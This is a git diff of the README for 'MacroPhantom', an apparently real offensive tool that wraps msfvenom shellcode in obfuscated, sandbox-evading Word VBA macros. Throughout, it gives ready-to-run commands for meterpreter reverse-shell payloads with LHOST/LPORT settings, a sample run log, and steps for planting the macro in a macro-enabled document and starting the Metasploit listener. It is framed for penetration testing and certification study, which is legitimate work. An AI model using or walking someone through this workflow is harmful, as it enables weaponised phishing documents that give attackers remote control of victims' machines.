@@ -1,21 +1,43 @@
 # MacroPhantom
 
-![License](https://img.shields.io/badge/License-MIT-blue)
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
-![Platform](https://img.shields.io/badge/Platform-Windows%20|%20Linux%20|%20macOS-green)
+<p align="center">
+  <img src="https://img.shields.io/badge/Version-1.0-brightgreen" alt="Version">
+  <img src="https://img.shields.io/badge/Language-Python%203-blue" alt="Language">
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-orange" alt="Platform">
+  <img src="https://img.shields.io/badge/License-MIT-lightgrey" alt="License">
+</p>
 
-**MacroPhantom** is an advanced VBA payload generator that creates encoded and obfuscated shellcode for Microsoft Office macros, designed for security assessment and penetration testing purposes.
+<p align="center">
+  <b>MacroPhantom</b> is an advanced VBA payload generator that creates encoded and obfuscated shellcode for Microsoft Office macros.
+</p>
 
-Created by Ivan Spiridonov (xbz0n) | [https://xbz0n.sh](https://xbz0n.sh)
+<p align="center">
+  <a href="https://xbz0n.sh"><img src="https://img.shields.io/badge/Blog-xbz0n.sh-red" alt="Blog"></a>
+</p>
+
+---
+
+## Overview
+
+MacroPhantom automates the process of generating XOR+Caesar encrypted shellcode and embedding it into VBA macros for Microsoft Office documents. The tool streamlines the workflow for security professionals during penetration tests and security assessments, particularly for phishing simulations.
 
 ## Features
 
-- XOR and Caesar-based shellcode encoding
-- Anti-sandbox techniques to evade detection
-- Support for both modern and legacy Microsoft Word versions
-- Customizable encoding keys
-- Automatic Metasploit handler generation
-- Cross-platform compatibility
+- **Self-contained** - All functionality consolidated in a single Python script
+- **XOR and Caesar-based encoding** - Dual-layer shellcode encryption
+- **Anti-sandbox techniques** - Sleep timer and other evasion methods
+- **Cross-version compatibility** - Support for both modern and legacy Word
+- **Customizable encoding** - Adjustable XOR and Caesar cipher keys
+- **Metasploit integration** - Automatic handler generation
+
+## Version Compatibility
+
+| Word Version | Compatibility | Feature Support |
+|--------------|---------------|-----------------|
+| Word 2003-2007 | ✅ (legacy mode) | Basic evasion |
+| Word 2010-2016 | ✅ | Full evasion, PtrSafe declarations |
+| Word 2019-2021 | ✅ | Full evasion, PtrSafe declarations |
+| Microsoft 365 | ✅ | Full evasion, PtrSafe declarations |
 
 ## Requirements
 
@@ -25,67 +47,90 @@ Created by Ivan Spiridonov (xbz0n) | [https://xbz0n.sh](https://xbz0n.sh)
 
 ## Installation
 
-1. Clone the repository:
 ```bash
+# Clone the repository
 git clone https://github.com/username/MacroPhantom.git
 cd MacroPhantom
-```
 
-2. Ensure requirements are installed:
-- Python 3.8+: https://www.python.org/downloads/
-- Metasploit Framework: https://www.metasploit.com/
-- Mono (for Linux/macOS): `sudo apt install mono-devel` or `brew install mono`
+# Ensure the script is executable
+chmod +x VBS_Macro_Generator.py
+```
 
 ## Usage
 
 ### Basic Usage
 
 ```bash
-python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port>
+# Generate macros for modern Word versions (2010+)
+python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444
 ```
 
 ### Advanced Options
 
 ```bash
 # Generate macros for legacy Word versions (2003-2007)
-python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --legacy
+python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --legacy
 
 # Use custom encoding keys
-python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --xor-key 123 --add-key 5
+python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --xor-key 123 --add-key 5
 
 # Use a different payload
-python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --payload windows/meterpreter/reverse_tcp
+python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --payload windows/meterpreter/reverse_tcp
 
 # Specify an output directory
-python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --output-dir /path/to/output
+python3 VBS_Macro_Generator.py --LHOST 192.168.1.100 --LPORT 4444 --output-dir /path/to/output
 ```
 
-### Full Command Options
+## Command Line Options
+
+| Option | Description | Default |
+|--------|-------------|---------|
+| `--LHOST` | IP address to listen on (required) | - |
+| `--LPORT` | Port to listen on (required) | - |
+| `--payload` | Metasploit payload to use | windows/meterpreter/reverse_https |
+| `--xor-key` | XOR key value (0-255) | 250 (0xFA) |
+| `--add-key` | Additive key value | 2 |
+| `--legacy` | Generate macros for Word 2007 and earlier | False |
+| `--output-dir` | Directory to save generated files | Current directory |
+
+## Workflow
+
+1. The tool generates shellcode using msfvenom with your specified parameters
+2. It uses a C# program to encrypt the shellcode with XOR and Caesar ciphers
+3. The encrypted shellcode is embedded into a VBA macro template
+4. The tool creates a Metasploit resource file for handling the connection
+
+## Demo Output
+
+After successful execution, you'll see output similar to this:
 
 ```
---LHOST           Local host IP address (required)
---LPORT           Local port number (required)
---payload         Msfvenom payload (default: windows/meterpreter/reverse_https)
---xor-key         XOR key value (default: 250)
---add-key         Additive key value (default: 2)
---legacy          Generate macros for Word 2007 and earlier
---output-dir      Output directory for generated files (default: current directory)
+[*] Checking requirements...
+[+] Python version: OK
+[+] Metasploit Framework: OK
+[+] Mono: OK
+[*] Generating shellcode with msfvenom...
+[+] Shellcode generated and saved to shellcode.txt
+[*] Encoding shellcode...
+[+] C# encoder created at Encoder.cs
+[+] C# encoder compiled to Encoder.exe
+[+] Shellcode encoded successfully
+[*] Generating Word VBA macros...
+[+] VBA macro code generated at macro_payload.txt
+[*] Creating Metasploit handler script...
+[+] Metasploit handler script created at handler.rc
+[*] Run with: msfconsole -r handler.rc
+
+[*] Word Compatibility: The generated macros are compatible with Word 2010-2021 and Microsoft 365
+
+[+] All files generated successfully in .
+[*] Next steps:
+  1. Copy the VBA code from macro_payload.txt
+  2. Open Microsoft Word, press Alt+F11 to open the VBA editor
+  3. Insert a new module under 'Normal' project
+  4. Paste the code and save as a macro-enabled document (.docm)
+  5. Start the Metasploit handler with: msfconsole -r handler.rc
 ```
-
-## Microsoft Word Compatibility
-
-- **Modern Word (default)**: Compatible with Word 2010, 2013, 2016, 2019, 2021, and Microsoft 365
-- **Legacy Word (--legacy flag)**: Compatible with Word 2003 and 2007
-
-## How It Works
-
-1. Generates shellcode using msfvenom with the specified LHOST and LPORT
-2. Encodes the shellcode using a C# encoder with XOR and Caesar ciphers
-3. Creates a VBA macro that:
-   - Implements anti-sandbox techniques
-   - Decodes and executes the shellcode in memory
-   - Triggers on document open
-4. Generates a Metasploit handler configuration
 
 ## Using the Generated Macro
 
@@ -97,10 +142,26 @@ python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --output-di
 6. Save as a macro-enabled document (.docm)
 7. Start the Metasploit handler with: `msfconsole -r handler.rc`
 
-## Disclaimer
+## Security Considerations
 
-This tool is provided for educational and authorized security testing purposes only. Usage of MacroPhantom for attacking targets without prior mutual consent is illegal. Users are responsible for complying with all applicable local, state, and federal laws. The author assumes no liability and is not responsible for any misuse or damage caused by this program.
+- This tool is for educational purposes and authorized testing only
+- Always obtain proper permission before performing any penetration testing
+- The macros generated may be detected by security software
+- Use responsibly and legally
+
+## Contributing
+
+Contributions are welcome! Please feel free to submit a Pull Request.
+
+## Author
+
+- **Ivan Spiridonov (xbz0n)** - [Blog](https://xbz0n.sh) | [GitHub](https://github.com/xbz0n)
 
 ## License
 
 This project is licensed under the MIT License - see the LICENSE file for details.
+
+## Acknowledgments
+
+- Special thanks to the penetration testing community for inspiration
+- Made for OSEP certification challenges
